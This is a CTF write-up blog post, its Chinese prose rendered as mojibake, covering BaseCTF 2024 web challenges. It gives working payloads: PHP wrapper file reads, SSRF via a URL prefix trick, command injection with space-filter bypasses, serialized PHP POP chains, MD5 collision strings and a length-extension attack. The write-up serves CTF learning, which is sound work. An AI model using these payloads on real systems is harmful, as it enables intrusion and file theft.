---
title: BaseCTF 2024 webéƒ¨åˆ†wp
date: 2024-09-08 19:56:38
permalink: /pages/a0e9c3/
categories:
  - wp
tags:
  - æ¯”èµ›
  - ctf
  - wp
author: 
  name: the0n3
  link: https://the0n3.top
---
# BaseCTF 2024 webéƒ¨åˆ†wp

![empty](/medias/basectf/empty.jpg)

## [Week1] A Dark Room

è€ƒç‚¹ï¼š`ä¿¡æ¯æ”¶é›†`

f12æ‰“å¼€æµè§ˆå™¨è°ƒè¯•å·¥å…·ï¼Œåœ¨æºç é¡µå¯ä»¥çœ‹åˆ°æ³¨é‡Šçš„flag

![1](/medias/basectf/1.png)

## [Week1] Aura é…±çš„ç¤¼ç‰©

è€ƒç‚¹ï¼š`ä¼ªåè®®ã€é‚®ä»¶æ ¼å¼`

```php
$pen = $_POST['pen'];
if (file_get_contents($pen) !== 'Aura')
{
    die('è¿™æ˜¯ Aura çš„ç¤¼ç‰©ï¼Œä½ ä¸æ˜¯ Auraï¼');
}
```

é¦–å…ˆï¼Œfile_get_contents()å‡½æ•°æ˜¯è¯»å–æ–‡ä»¶çš„ï¼Œæ‰€ä»¥å¦‚æœä½ ç›´æ¥ä¼ Auraæ˜¯é”™çš„ã€‚åœ¨phpä¸­ï¼Œå®˜æ–¹æœ‰æä¾›ä¸€å¥—åè®®ï¼Œå¦‚ï¼šphp://filterã€php://input data:text/plainç­‰åè®®ã€‚è¿™é¢˜éœ€è¦ç”¨åˆ°data:text/plainåè®®

ç”¨æ³•ï¼š`data:text/plain,æ–‡æœ¬å†…å®¹`æˆ–è€…`data:text/plain;base64,base64ç¼–ç çš„æ–‡æœ¬å†…å®¹`ä¼šæŠŠåé¢çš„å†…å®¹å½“ä½œæ–‡ä»¶æµ

æ‰€ä»¥å¯ä»¥ä½¿ç”¨`data:text/plain,Aura`æ¥ç»•è¿‡

```php
$challenge = $_POST['challenge'];
if (strpos($challenge, 'http://jasmineaura.github.io') !== 0)
{
    die('è¿™ä¸æ˜¯ Aura çš„åšå®¢ï¼');
}
```

`strpos($challenge, 'http://jasmineaura.github.io') !== 0`åˆ¤æ–­å˜é‡$challengeæ˜¯ä¸æ˜¯ä»ç´¢å¼•0å¼€å§‹å‡ºç°çš„ï¼Œä¹Ÿå°±æ˜¯å¿…é¡»ä»¥è¦æ±‚çš„å­—ç¬¦ä¸²`http://jasmineaura.github.io`å¼€å¤´

æœ€å
```php
$blog_content = file_get_contents($challenge);
if (strpos($blog_content, 'å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦') === false)
{
    die('è¯·å»åšå®¢é‡Œé¢å†™ä¸‹æ„Ÿæƒ³å“¦~');
}
```

è¿™é‡Œï¼Œä½¿ç”¨file_get_contents()å‡½æ•°è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå¦‚æœæœ‰`å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦`ï¼Œæ‰å¯ä»¥ç»§ç»­å¾€ä¸‹èµ°

è¿™ä¸ªfile_get_contents()å‡½æ•°ä¹Ÿå¯ä»¥é€šè¿‡urlåœ°å€è¯»å–æ–‡ä»¶

å¦‚æœä½ å»äº†è¿™ä¸ªå¸ˆå‚…çš„åšå®¢ï¼Œä½ æƒ³åœ¨åšå®¢é‡Œç•™è¨€æ¥å®Œæˆè¿™é“é¢˜ï¼Œé‚£ä¹ˆä½ ä¼šæ— åŠŸè€Œè¿”ï¼Œå› ä¸ºæ ¹æœ¬å°±æ²¡æœ‰ç•™è¨€ç³»ç»Ÿ

å¹¶ä¸”ç°åœ¨è¿™ä¸ªå˜é‡å·²ç»é™åˆ¶äº†å‰ç¼€`http//jasmineaura.github.io`ï¼Œæ‰€ä»¥åªèƒ½åœ¨è¿™ä¸ªåŸºç¡€ä¸Šç»§ç»­æ€è€ƒ

æœ€åå¯ä»¥æƒ³åˆ°username@domain.comçš„é‚®ç®±æ ¼å¼ï¼Œè¿™æ ·å‰ç¼€å°±å˜æˆusernameäº†ï¼Œfile_get_contentsä¼šè®¿é—®åé¢çš„urlã€‚ä¸éš¾å‘ç°ï¼Œé¢˜ç›®é¡µé¢å°±æœ‰`å·²ç»æ”¶åˆ°Kengwangçš„ç¤¼ç‰©å•¦`çš„å­—æ ·ï¼Œé‚£ä¹ˆç›´æ¥SSRFæ¥æ„é€ payload`http://jasmineaura.github.io@127.0.0.1`

æœ€åè¿˜æœ‰ä¸€ä¸ªincludeå‡½æ•°ï¼Œæ²¡æœ‰é™åˆ¶ï¼Œç©æ³•éå¸¸å¤šã€‚è¿™é‡Œè®²ä¸‹æœ€ç®€å•çš„ï¼Œä½¿ç”¨å‰é¢è®²åˆ°çš„php://filteråè®®ï¼ŒæŠŠæ–‡ä»¶å†…å®¹è¯»å‡ºæ¥ï¼Œè¿™é‡Œpayload`gift=php://filter/convert.base64-encode/resource=flag.php`ï¼ŒæŠŠæ–‡ä»¶å†…å®¹ä»¥base64å½¢å¼è¯»å‡ºæ¥base64è§£ç åå¾—åˆ°`<?php // BaseCTF{3aa10ad4-2f6c-4cd2-98c8-cd62edc43a3b}`

## [Week1] HTTP æ˜¯ä»€ä¹ˆå‘€

è€ƒç‚¹ï¼š`å¸¸è§çš„ä¼ å‚`

é¢˜ç›®ä»‹ç»äº†å¸¸è§çš„å·¥å…·ï¼Œè¿™æ˜¯ä¸€é¢˜å¾ˆå¥½çš„å…¥é—¨é¢˜ç›®ï¼Œå‡ºé¢˜äººæœ‰å¿ƒäº†ã€‚è¿™é¢˜ä½¿ç”¨hackbarè¿˜æ˜¯éå¸¸æ–¹ä¾¿çš„

1ã€GETä¼ å‚ç‰¹æ®Šå­—ç¬¦çš„è½¬ä¹‰ã€‚åœ¨urlé‡Œä½¿ç”¨GETä¼ å‚æ—¶ï¼Œ%ï¼Œ&ï¼Œ=ç­‰ç‰¹æ®Šå­—ç¬¦æœ‰ç‰¹æ®Šè¯­æ„ï¼Œå¦‚ï¼š%ç”¨ä½œurlç¼–ç ï¼Œ&ç”¨ä½œå‚æ•°åˆ†éš”ç¬¦ï¼Œ=ç”¨ä½œå‚æ•°åå’Œå‚æ•°å€¼çš„åˆ†éš”ç¬¦ï¼Œå¦‚æœä½ æ²¡æœ‰è¦ä¼ çš„å­—ç¬¦ï¼Œæ²¡æœ‰è¿™äº›è¯­è¨€ï¼Œéœ€è¦è¿›è¡Œurlç¼–ç ï¼Œé¿å…ç‰¹æ®Šè¯­æ„åƒæ‰æœ¬æ„ã€‚

GETå‚æ•°ï¼šå‚æ•°å`basectf`ï¼Œå‚æ•°å€¼`we1c%00me`ï¼Œè¿™é‡Œçš„%æ²¡æœ‰ç‰¹æ®Šè¯­æ„ï¼Œæ‰€ä»¥å¯¹%ç¼–ç ä¸€æ¬¡ã€‚%ç™¾åˆ†å·urlç¼–ç å`%25`

æ‰€ä»¥ä¼ å‚`url?basectf=we1c%2500me`

2ã€ç®€å•çš„postä¼ å‚  
`BASE=fl@g`

3ã€cookieä¼ å‚ï¼Œcookieä¸­å«æœ‰ç©ºæ ¼ï¼Œä½¿ç”¨urlç¼–ç ä¸€ä¸‹ 
`c00k13=i%20can't%20eat%20it`

4ã€User-Agentå‚æ•°ï¼Œè¿™ä¸ªå­—æ®µå¸¸ç”¨æ¥è®°å½•ç”¨æˆ·çš„æ“ä½œç³»ç»Ÿï¼Œä»¥åŠå½“å‰çš„æµè§ˆå™¨(ä¸€äº›ç«™ç‚¹ä¼šé€šè¿‡user-agentå­—æ®µæ¥åˆ¤æ–­æ˜¯å¦æ˜¯çˆ¬è™«ï¼Œå¦‚Bç«™)  

5ã€Refererå‚æ•°ï¼Œè¿™ä¸ªå­—æ®µå¸¸ç”¨æ¥è®°å½•å½“å‰é¡µé¢çš„æ¥æº

6ã€IPï¼Œå¸¸ç”¨X-Forwarded-Forå­—æ®µæ¥è®°å½•ç”¨æˆ·çš„ip

![2](/medias/basectf/2.png)

æäº¤åæ²¡æœ‰å‡ºç°flagï¼Œæç¤ºå·²ç»å‡ºç°è¿‡äº†ã€‚f12æ‰“å¼€æµè§ˆå™¨è°ƒè¯•å·¥å…·ï¼Œåœ¨ç½‘ç»œé¡µå¯ä»¥çœ‹åˆ°æŸä¸ªæ¥å£è¿”å›äº†ä¸€ä¸²ç±»ä¼¼base64çš„å­—ç¬¦ä¸²

![3](/medias/basectf/3.png)

base64è§£ç æ‹¿åˆ°flag

## [Week1] md5ç»•è¿‡æ¬¸

è€ƒç‚¹ï¼š`phpç‰¹æ€§(æ¼æ´)`

![4](/medias/basectf/4.png)

å¦‚æœåˆšå…¥é—¨ï¼Œçœ‹åˆ°é¢˜ç›®æœ‰`error_reporting(0);`æ—¶ï¼Œå¯ä»¥æŠŠé¢˜ç›®æ‹·åˆ°æœ¬åœ°çš„ç¯å¢ƒï¼Œåœ¨æœ¬åœ°æµ‹è¯•ï¼Œæ ¹æ®æŠ¥é”™åˆ†æï¼Œå¯ä»¥èŠ‚çœå¾ˆå¤šæ—¶é—´

è¿™é¢˜è¦æ±‚è¦æœ‰è¿™å››ä¸ªå‚æ•°ï¼Œæ‰ä¼šç»§ç»­å¾€ä¸‹è¿›è¡Œã€‚

ç¬¬ä¸€å±‚åˆ¤æ–­ï¼šç”¨æˆ·ä¸ç­‰äºå¯†ç ï¼Œç”¨æˆ·åï¼Œå¯†ç çš„md5å€¼å¼±ç›¸ç­‰ã€‚

ç¬¬äºŒå±‚åˆ¤æ–­ï¼šç”¨æˆ·å2ä¸ç­‰äºå¯†ç 2ï¼Œç”¨æˆ·å2ï¼Œå¯†ç 2çš„md5å€¼å¼ºç›¸ç­‰ã€‚

è¿™é‡Œçš„ä¸¤ä¸ªåˆ¤æ–­éƒ½å¯ä»¥é€šè¿‡md5()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„æ•°æ®æ¥ç»•è¿‡

æ‰€ä»¥å¯ä»¥GETä¼ å‚`?name[]=1&name2[]=1`ï¼ŒPOSTä¼ å‚`password[]=2&password2[]=2`

## [Week1] upload

è€ƒç‚¹ï¼š`phpæ–‡ä»¶ä¸Šä¼ ï¼Œå‘½ä»¤æ‰§è¡Œ`

ç™½é€çš„phpæ–‡ä»¶ä¸Šä¼ 

å‡è®¾ä»–æœ‰è¿‡æ»¤ï¼Œå…ˆä¸Šä¼ æ­£ç»çš„pngå›¾ç‰‡ï¼Œä¸Šä¼ åï¼Œå¤„ç†æ–‡ä»¶ä¸Šä¼ çš„æºç å°±å‡ºæ¥äº†ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œä¸”ä¸å½“å‰çš„index.phpåœ¨åŒä¸€ç›®å½•ï¼Œç›´æ¥ä¸Šä¼ phpæ–‡ä»¶é¡µå¯ä»¥è§£æ

ä¸Šä¼ åï¼Œè®¿é—®`url/uploads/phpæ–‡ä»¶å`ï¼Œçœ‹åˆ°è§£æçš„php

![5](/medias/basectf/5.png)

## [Week1] å–µå–µå–µÂ´â€¢ï»Œâ€¢`

è€ƒç‚¹ï¼š`å‘½ä»¤æ‰§è¡Œ`

ç®€å•çš„å‘½ä»¤æ‰§è¡Œï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç™½é€ã€‚payload`?DT=system("tac /flag");`

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
$a = $_GET['DT'];
eval($a);
?>
```

## [Week2] ä¸€èµ·åƒè±†è±†

è€ƒç‚¹ï¼š`ä¿¡æ¯æ”¶é›†ï¼Œbase64`

æ‰“å¼€é¢˜ç›®ï¼Œçœ‹èµ·æ¥æ˜¯ä¸€ä¸ªç®€å•çš„é™æ€é¢˜ç›®ï¼ŒæŒ‰f12æ²¡æœ‰ååº”ï¼Œä¼°è®¡ç¦ç”¨äº†ã€‚è¿˜å¯ä»¥ä½¿ç”¨å³é”®çš„æ£€æŸ¥ï¼Œæµè§ˆå™¨`æ›´å¤š`é‡Œçš„æµè§ˆå™¨è°ƒè¯•å·¥å…·

æ‰“å¼€è°ƒè¯•å·¥å…·åï¼Œä½¿ç”¨ctrl+f(æœç´¢)æ²¡æœ‰æœåˆ°basectfï¼Œè€å¿ƒç¿»çœ‹æºç åï¼Œå‘ç°å¥‡æ€ªçš„base64ç¼–ç ï¼Œè§£ç åå¾—åˆ°flag

![6](/medias/basectf/6.png)

## [Week2] ä½ å¬ä¸åˆ°æˆ‘çš„å£°éŸ³

è€ƒç‚¹ï¼š`shellå‘½ä»¤ï¼Œé‡å®šå‘å†™æ–‡ä»¶`

æ‰“å¼€é¢˜ç›®ï¼Œåªè¦ç®€å•çš„ä¸¤è¡Œä»£ç ï¼Œå…¶ä¸­shell_exec()å‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œæ²¡æœ‰å›æ˜¾

```php
<?php
highlight_file(__FILE__);
shell_exec($_POST['cmd']);
```

é€šè¿‡shellæŒ‡ä»¤ï¼Œåœ¨åŒçº§ç›®å½•ä¸‹å®ç°è¯»å†™æ–‡ä»¶è¯»å–flag

payloadï¼šcmd=echo `ls /` > 1.txtï¼ŒæŠŠ`ls /`å‘½ä»¤çš„ç»“æœå†™åˆ°1.txté‡Œï¼Œè®¿é—®1.txtï¼Œçœ‹åˆ°`ls /`çš„ç»“æœï¼Œå¯ä»¥çŸ¥é“flagåœ¨æ ¹ç›®å½•ä¸‹

payloadï¼šcmd=cat /flag > 1.txtï¼ŒæŠŠflagå†™åˆ°1.txté‡Œï¼Œè®¿é—®1.txtï¼Œçœ‹åˆ°flag

## [Week2] RCEisamazingwithspace

è€ƒç‚¹ï¼š`shellå‘½ä»¤ï¼Œç©ºæ ¼ç»•è¿‡`

```php
<?php
highlight_file(__FILE__);
$cmd = $_POST['cmd'];
// è¿‡æ»¤ç©ºæ ¼
if (preg_match('/\s/', $cmd)) {
    echo 'Space not allowed in command';
    exit;
}
system($cmd);
```

è¿‡æ»¤äº†ç©ºæ ¼ï¼Œåœ¨shellå‘½ä»¤è¡Œä¸­ï¼Œå¯ä»¥ä½¿ç”¨`$IFS`,`${IFS}`,`$IFS$9`

payloadï¼š`cmd=tac$IFS/flag`

## [Week2] ez_ser

è€ƒç‚¹ï¼š`phpååºåˆ—åŒ–`

çœ‹åˆ°é¢˜ç›®æºç ï¼Œæƒ³æƒ³é“¾å­æ€ä¹ˆèµ°

::: details
```php
<?php
highlight_file(__FILE__);
error_reporting(0);
class re{
    public $chu0;
    public function __toString(){
        if(!isset($this->chu0)){
            return "I can not believes!";
        }
        $this->chu0->$nononono;
    }
}
class web {
    public $kw;
    public $dt;

    public function __wakeup() {
        echo "lalalla".$this->kw;
    }

    public function __destruct() {
        echo "ALL Done!";
    }
}

class pwn {
    public $dusk;
    public $over;

    public function __get($name) {
        if($this->dusk != "gods"){
            echo "ä»€ä¹ˆï¼Œä½ ç«Ÿæ•¢ä¸è®¤å¯?";
        }
        $this->over->getflag();
    }
}

class Misc {
    public $nothing;
    public $flag;

    public function getflag() {
        eval("system('cat /flag');");
    }
}

class Crypto {
    public function __wakeup() {
        echo "happy happy happy!";
    }

    public function getflag() {
        echo "you are over!";
    }
}
```
:::

ååºåˆ—åŒ–ï¼Œå…ˆè§¦å‘wakeup()æ–¹æ³•ï¼Œé€šè¿‡echoè§¦å‘toStringæ–¹æ³•ï¼Œé€šè¿‡$this->chu0->$nonononoè§¦å‘get()æ–¹æ³•ï¼Œæœ€åè°ƒç”¨$this->over->getflag();æŸ¥çœ‹flag

```php
$payload = new web();
$payload -> kw = new re();
$payload -> kw -> chu0 = new pwn();
$payload -> kw -> chu0 -> over = new Misc();

echo urlencode(serialize($payload));
```

å¯ä»¥æ‰“å°å‡ºpayload`?ser=O%3A3%3A%22web%22%3A2%3A%7Bs%3A2%3A%22kw%22%3BO%3A2%3A%22re%22%3A1%3A%7Bs%3A4%3A%22chu0%22%3BO%3A3%3A%22pwn%22%3A2%3A%7Bs%3A4%3A%22dusk%22%3BN%3Bs%3A4%3A%22over%22%3BO%3A4%3A%22Misc%22%3A2%3A%7Bs%3A7%3A%22nothing%22%3BN%3Bs%3A4%3A%22flag%22%3BN%3B%7D%7D%7Ds%3A2%3A%22dt%22%3BN%3B%7D`

## [Week2] Really EZ POP

è€ƒç‚¹ï¼š`ååºåˆ—åŒ–çš„å±æ€§`

æºç 

::: details
```php
<?php
highlight_file(__FILE__);

class Sink
{
    private $cmd = 'echo 123;';
    public function __toString()
    {
        eval($this->cmd);
    }
}

class Shark
{
    private $word = 'Hello, World!';
    public function __invoke()
    {
        echo 'Shark says:' . $this->word;
    }
}

class Sea
{
    public $animal;
    public function __get($name)
    {
        $sea_ani = $this->animal;
        echo 'In a deep deep sea, there is a ' . $sea_ani();
    }
}

class Nature
{
    public $sea;

    public function __destruct()
    {
        echo $this->sea->see;
    }
}

if ($_POST['nature']) {
    $nature = unserialize($_POST['nature']);
}
```
:::

ååºåˆ—åŒ–ï¼Œé“¾å­å…¥å£ï¼šNatureçš„destructæ–¹æ³•ï¼Œecho $this->sea->see;æ‰“å°natureç±»çš„seaçš„seeå˜é‡ï¼Œå¾ˆæ˜æ˜¾æ²¡æœ‰seaè¿™ä¸ªå˜é‡ï¼Œæ‰€ä»¥è§¦å‘Seaç±»çš„getæ–¹æ³•ï¼Œåœ¨getæ–¹æ³•é‡Œè°ƒç”¨äº†$sea_ani()æ–¹æ³•ï¼Œå¯ä»¥è§¦å‘Shareç±»çš„invokeæ–¹æ³•ï¼Œinvokeæ–¹æ³•é‡Œçš„echoè§¦å‘Sinkæ–¹æ³•çš„toStringæ–¹æ³•ï¼ŒtoStringæ–¹æ³•é‡Œçš„evalè§¦å‘Sinkç±»çš„cmdå˜é‡

æ„é€ ï¼š
::: details
```php
<?php

class Sink
{
    # å…ˆä¿®æ”¹ä¸ºpublic
    public $cmd = 'echo 123;';
    public function __toString()
    {
        eval($this->cmd);
    }
}

class Shark
{
    # å…ˆä¿®æ”¹ä¸ºpublic
    public $word = 'Hello, World!';
    public function __invoke()
    {
        echo 'Shark says:' . $this->word;
    }
}

class Sea
{
    public $animal;
    public function __get($name)
    {
        $sea_ani = $this->animal;
        echo 'In a deep deep sea, there is a ' . $sea_ani();
    }
}

class Nature
{
    public $sea;

    public function __destruct()
    {
        echo $this->sea->see;
    }
}

$payload = new Nature();
$payload -> sea = new Sea();
$payload -> sea -> animal = new Shark();
$payload -> sea -> animal -> word = new Sink();
$payload -> sea -> animal -> word -> cmd = system("tac /flag");

echo serialize($payload);
```
:::

è¿™æ ·ä¼šæŠ¥é”™ï¼Œå› ä¸ºphp5ç‰ˆæœ¬å¯¹ååºåˆ—åŒ–ä¸¥æ ¼åŒºåˆ†å˜é‡çš„pulic,privateçš„å±æ€§ã€‚ä¿®æ”¹åè¿è¡Œï¼Œè™½ç„¶æŠ¥é”™ï¼Œä½†å¯ä»¥å¾—åˆ°æˆ‘ä»¬æœŸæœ›çš„`O:6:"Nature":1:{s:3:"sea";O:3:"Sea":1:{s:6:"animal";O:5:"Shark":1:{s:4:"word";O:4:"Sink":1:{s:3:"cmd";s:0:"";}}}}`

æˆ‘ä»¬è¿™é‡Œæ˜¯é€šè¿‡publicå±æ€§å¾—åˆ°payloadï¼Œä¸privateå±æ€§å¾—åˆ°çš„payloadæœ‰åŒºåˆ«ï¼Œéœ€è¦ç¨åŠ ä¿®æ”¹

å‚è€ƒï¼š

[ã€phpååºåˆ—åŒ–å…¥é—¨ã€‘](https://macchiato.ink/web/web_security/unserialize/)

![7](/medias/basectf/7.png)

æ‰€ä»¥privateç±»å‹çš„å˜é‡éœ€è¦ä¿®æ”¹ä»–ä»¬çš„å½¢å¼å’Œé•¿åº¦ï¼Œå½¢å¼æ”¹ä¸ºï¼š`%00ç±»å%00å˜é‡å`,é•¿åº¦ä¸º`å˜é‡åé•¿åº¦+ç±»åé•¿åº¦+2`

åŸæ¥ï¼Œå˜é‡word,cmdæ˜¯privateç±»å‹çš„ï¼Œæ‰€ä»¥ä¿®æ”¹ä»–ä»¬åœ¨payloadé‡Œçš„æ ¼å¼

`O:6:"Nature":1:{s:3:"sea";O:3:"Sea":1:{s:6:"animal";O:5:"Shark":1:{s:11:"%00Shark%00word";O:4:"Sink":1:{s:9:"%00Sink%00cmd";s:0:"";}}}}`

æœ€åç»™å˜é‡cmdæ·»åŠ ä¸€ä¸ªå€¼ï¼Œåœ¨evalå‡½æ•°é‡Œæ‰§è¡Œå‘½ä»¤

`O:6:"Nature":1:{s:3:"sea";O:3:"Sea":1:{s:6:"animal";O:5:"Shark":1:{s:11:"%00Shark%00word";O:4:"Sink":1:{s:9:"%00Sink%00cmd";s:10:"phpinfo();";}}}}`

å¯ä»¥æˆåŠŸæ‰§è¡Œphpinfo()å‡½æ•°ï¼Œæ‹¿flagæ—¶ï¼ŒæŠŠå˜é‡å€¼å’Œå¯¹åº”é•¿åº¦æ”¹ä¸€ä¸‹

## [Week2] æ‰€ä»¥ä½ è¯´ä½ æ‡‚ MD5?

è€ƒç‚¹ï¼š`md5ç›¸å…³ç»•è¿‡`

æˆ‘æ€»ç»“äº†ä¸€äº›md5ç»•è¿‡ï¼Œè¿™é“é¢˜ç›®ä¹Ÿå¤Ÿç”¨ï¼š[ã€md5ç›¸å…³ç»•è¿‡ã€‘](/pages/25c740/)

```php
if (!($apple !== $banana && md5($apple) === md5($banana))) {
    die('åŠ å¼ºéš¾åº¦å°±ä¸ä¼šäº†?');
}
```
ç¬¬ä¸€ä¸ªifåˆ¤æ–­ï¼Œç›´æ¥ä½¿ç”¨æ•°ç»„ç»•è¿‡`apple[]=1&banana[]=2`

```php
if (!((string)$apple !== (string)$banana && md5((string)$apple) == md5((string)$banana))) {
    die('éš¾å—?ä¸éš¾!');
}
```
ç¬¬äºŒä¸ªifåˆ¤æ–­ï¼Œè¿™é‡Œä¼šå…ˆå¼ºè½¬ä¸ºstringç±»å‹å†å–md5å€¼ï¼Œä½†æ˜¯ä½¿ç”¨äº†`å¼±æ¯”è¾ƒ`ï¼Œå¯ä»¥ä½¿ç”¨md5å€¼ä¸º0eå¼€å¤´çš„å­—ç¬¦ä¸²

- 240610708
- QLTHNDT

è¿™ä¸€ç»„å˜é‡md5åéƒ½æ˜¯0eå¼€å¤´çš„å­—ç¬¦ä¸²`appple=240610708&bananana=QLTHNDT`

```php
if (!((string)$apple !== (string)$banana && md5((string)$apple) === md5((string)$banana))) {
    die('å˜»å˜», ä¸ä¼šäº†? æ²¡çœ‹ç›´æ’­å›æ”¾?');
}
```
ç¬¬ä¸‰ä¸ªifåˆ¤æ–­ï¼Œä½¿ç”¨äº†å¼ºæ¯”è¾ƒï¼Œé‚£ä¹ˆåªèƒ½ä½¿ç”¨md5å€¼ç›¸åŒçš„å­—ç¬¦ä¸²äº†ã€‚å¯ä»¥ä½¿ç”¨fastcollå·¥å…·ç”Ÿæˆæ–‡æœ¬æ–‡ä»¶ï¼Œå†urlç¼–ç æ‰“å°

ä¹Ÿå¯ä»¥ä½¿ç”¨å¤§ä½¬å·²ç»å‡†å¤‡æ‰¾åˆ°çš„å­—ç¬¦ä¸²

- %af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab
- %af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab

`apppple=ç¬¬ä¸€ä¸ªå€¼&banananana=ç¬¬äºŒä¸ªå€¼`

è¿™é‡Œè¦ç”¨bpå‘åŒ…äº†ï¼Œè¿™ä¸¤ä¸ªæ•°æ®éƒ½æ˜¯urlç¼–ç ï¼Œhackbarå‘åŒ…ä¼šæŠ¥é”™ã€‚ä½¿ç”¨bpå‘åŒ…åï¼Œè¿”å›äº†md5($random)

æœ€åéš¾ç‚¹ï¼šmd5é•¿åº¦æ‰©å±•æ”»å‡»

1ã€$nameå¯æ§ï¼Œé™åˆ¶äº†nameçš„åç¼€admin   
2ã€md5($random)å·²çŸ¥ï¼Œ$randomæœªçŸ¥  
3ã€$md5å¯æ§  

è¦å®ç°ï¼šmd5($random . $name) == $md5

æ‰€ä»¥ä½ éœ€è¦æ§åˆ¶$name,$md5ï¼Œä½¿è¿™ä¸ªifåˆ¤æ–­æˆç«‹

[ã€md5é•¿åº¦æ‰©å±•æ”»å‡»å·¥å…·ã€‘](https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py)

é¦–å…ˆéœ€è¦çŸ¥é“é•¿åº¦åŠMD5å“ˆå¸Œå€¼ï¼Œç”Ÿæˆéšæœº16ä½é•¿åº¦çš„å­—èŠ‚ï¼Œ1byte=8bitï¼Œ16byte=128bitï¼Œ4ä¸ªäºŒè¿›åˆ¶æ•°è½¬åŒ–ä¸€ä¸ª16è¿›åˆ¶æ•°ï¼Œ128/4=32ï¼Œ32*3=96

å› æ­¤$_session['random']é•¿åº¦ä¸º96ä½ã€‚

å·²çŸ¥å®ƒçš„MD5å€¼ï¼ša0057ecf237a9ac5fcae22017f2a29cd

![8](/medias/basectf/8.png)

æœ€åå…³é”®éªŒè¯ä»£ç md5($random . $name) !== $md5

å…¶ä¸­$randomå€¼ä¸å¯æ§ï¼Œ$nameé™å®šäº†åç¼€ï¼Œ$md5å¯æ§

ç¬¬äºŒæ­¥ä½¿ç”¨è„šæœ¬å¾—åˆ°çš„nameå€¼å¯ä»¥å’Œ$randomåœ¨md5()å‡½æ•°çš„ä½œç”¨ä¸‹å¾—åˆ°æ–°çš„å“ˆå¸Œå€¼name=%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%03%00%00%00%00%00%00admin&md5=7b624b5883fb74b5e93069b459138fd9ä¼ å…¥å¯ä»¥ç»•è¿‡éªŒè¯

![9](/medias/basectf/9.png)


## [Week2] æ•°å­¦å¤§å¸ˆ

è€ƒç‚¹ï¼š`pythonçˆ¬è™«ã€å‘åŒ…`

